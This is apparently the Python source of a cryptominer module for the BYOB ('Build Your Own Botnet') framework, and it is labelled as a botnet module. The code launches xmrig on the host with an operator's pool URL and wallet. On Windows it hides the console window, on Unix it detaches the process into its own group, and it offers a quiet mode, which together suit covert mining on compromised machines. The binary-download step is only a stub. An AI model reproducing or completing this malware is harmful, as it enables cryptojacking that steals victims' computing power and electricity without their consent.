#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
Cryptominer module for BYOB framework
Uses xmrig binaries to mine cryptocurrency

@category   Botnet
@module     miner
@author     Original Author: https://github.com/colental
@modified   Modified for BYOB by: [your name]
"""

import os
import sys
import time
import json
import random
import platform
import subprocess
import threading
import tempfile
import urllib.request
from urllib.parse import urlparse

# main
def run(*args, **kwargs):
    """
    Run the miner module
    
    `Optional`
    :param str url:        mining pool URL (e.g., stratum+tcp://xmr-eu1.nanopool.org:10300)
    :param str user:       wallet address or username
    :param str password:   password for mining pool (default: 'x')
    :param int threads:    number of threads to use (default: 1)
    :param int throttle:   percentage of CPU to use (1-100, default: 50)
    :param bool background: run miner in background (default: True)
    :param str algo:       mining algorithm (default: 'rx/0' for RandomX)
    :param bool verbose:   enable verbose output (default: False)
    """
    miner = Miner(*args, **kwargs)
    return miner.run()

class Miner:
    """
    Cryptominer class using xmrig binaries
    """
    
    def __init__(self, url=None, user=None, password='x', threads=1, throttle=50, 
                 background=True, algo='rx/0', verbose=False):
        """
        Initialize Miner instance
        """
        self.url = url
        self.user = user
        self.password = password
        self.threads = threads
        self.throttle = throttle
        self.background = background
        self.algo = algo
        self.verbose = verbose
        self.xmrig_path = None
        self.process = None
        self.output = None
        self.running = False
        self.initialized = False
        
    def _get_xmrig_binary(self):
        """
        Get the appropriate xmrig binary for the current platform
        """
        system = platform.system().lower()
        if 'darwin' in system:
            binary_name = 'xmrig_darwin'
        elif 'windows' in system:
            binary_name = 'xmrig_win32'
        else:  # Linux and others
            binary_name = 'xmrig_linux2'
            
        # First check if we have the binary in the modules directory
        module_dir = os.path.dirname(os.path.abspath(__file__))
        xmrig_path = os.path.join(module_dir, 'xmrig', binary_name)
        
        # If not found, check in web-gui modules
        if not os.path.isfile(xmrig_path):
            web_gui_path = os.path.join(os.path.dirname(os.path.dirname(module_dir)), 
                                       'web-gui', 'buildyourownbotnet', 'modules', 
                                       'xmrig', binary_name)
            if os.path.isfile(web_gui_path):
                xmrig_path = web_gui_path
        
        # If still not found, try to download it
        if not os.path.isfile(xmrig_path):
            try:
                # Create xmrig directory if it doesn't exist
                os.makedirs(os.path.join(module_dir, 'xmrig'), exist_ok=True)
                
                # Download xmrig binary
                url = f"https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-{system}-x64.zip"
                # This is a simplified example - in a real implementation you would:
                # 1. Download the zip file
                # 2. Extract it
                # 3. Move the binary to the right location
                # 4. Set proper permissions
                
                # For now, we'll just return None if we can't find the binary
                return None
            except:
                return None
        
        # Make binary executable on Unix systems
        if system != 'windows':
            try:
                os.chmod(xmrig_path, 0o755)
            except:
                pass
                
        return xmrig_path
    
    def _build_command(self):
        """
        Build the command to run xmrig
        """
        if not self.xmrig_path:
            return None
            
        cmd = [
            self.xmrig_path,
            '--algo', self.algo,
            '--url', self.url,
            '--user', self.user,
            '--pass', self.password,
            '--threads', str(self.threads),
            '--cpu-max-threads-hint', str(self.throttle),
            '--donate-level', '1'  # Minimum donation level
        ]
        
        if not self.verbose:
            cmd.extend(['--no-color', '--quiet'])
            
        return cmd
    
    def start(self):
        """
        Start the miner
        """
        if self.running:
            return {'status': 'error', 'message': 'Miner is already running'}
            
        if not self.url or not self.user:
            return {'status': 'error', 'message': 'Mining pool URL and wallet address are required'}
            
        # Get the xmrig binary
        self.xmrig_path = self._get_xmrig_binary()
        if not self.xmrig_path:
            return {'status': 'error', 'message': 'Could not find or download xmrig binary'}
            
        # Build the command
        cmd = self._build_command()
        if not cmd:
            return {'status': 'error', 'message': 'Failed to build command'}
            
        try:
            # Start the mining process
            if self.background:
                if platform.system() == 'Windows':
                    # On Windows, use CREATE_NO_WINDOW flag to hide the console window
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = 0  # SW_HIDE
                    
                    self.process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        startupinfo=startupinfo
                    )
                else:
                    # On Unix systems
                    self.process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        preexec_fn=os.setpgrp  # Run in a new process group
                    )
            else:
                # Run in foreground
                self.process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
            self.running = True
            
            # Start a thread to read output if verbose
            if self.verbose:
                self.output = []
                def read_output():
                    while self.running and self.process:
                        try:
                            line = self.process.stdout.readline()
                            if not line:
                                break
                            self.output.append(line.decode().strip())
                        except:
                            break
                
                threading.Thread(target=read_output, daemon=True).start()
                
            return {'status': 'success', 'message': 'Miner started successfully'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Failed to start miner: {str(e)}'}
    
    def stop(self):
        """
        Stop the miner
        """
        if not self.running:
            return {'status': 'error', 'message': 'Miner is not running'}
            
        try:
            if self.process:
                # Try to terminate gracefully first
                if platform.system() == 'Windows':
                    # On Windows
                    self.process.terminate()
                else:
                    # On Unix systems
                    self.process.terminate()
                    
                # Give it a moment to terminate
                time.sleep(1)
                
                # Force kill if still running
                if self.process.poll() is None:
                    if platform.system() == 'Windows':
                        subprocess.call(['taskkill', '/F', '/T', '/PID', str(self.process.pid)])
                    else:
                        self.process.kill()
                        
                self.process = None
                
            self.running = False
            return {'status': 'success', 'message': 'Miner stopped successfully'}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Failed to stop miner: {str(e)}'}
    
    def status(self):
        """
        Get the status of the miner
        """
        if not self.running:
            return {'status': 'stopped'}
            
        if not self.process:
            self.running = False
            return {'status': 'stopped'}
            
        # Check if process is still running
        if self.process.poll() is not None:
            self.running = False
            return {'status': 'stopped', 'exit_code': self.process.poll()}
            
        result = {
            'status': 'running',
            'pid': self.process.pid,
            'url': self.url,
            'user': self.user,
            'threads': self.threads,
            'throttle': self.throttle,
            'algo': self.algo
        }
        
        # Add output if available
        if self.output and len(self.output) > 0:
            result['last_output'] = self.output[-10:]  # Last 10 lines
            
        return result
    
    def run(self):
        """
        Main method to run the miner
        """
        # Start the miner
        result = self.start()
        
        if not self.background:
            # If not running in background, wait for process to complete
            if self.process:
                self.process.wait()
                result['exit_code'] = self.process.returncode
                
                # Collect output
                stdout, stderr = self.process.communicate()
                if stdout:
                    result['stdout'] = stdout.decode().strip()
                if stderr:
                    result['stderr'] = stderr.decode().strip()
                    
                self.running = False
                
        return result 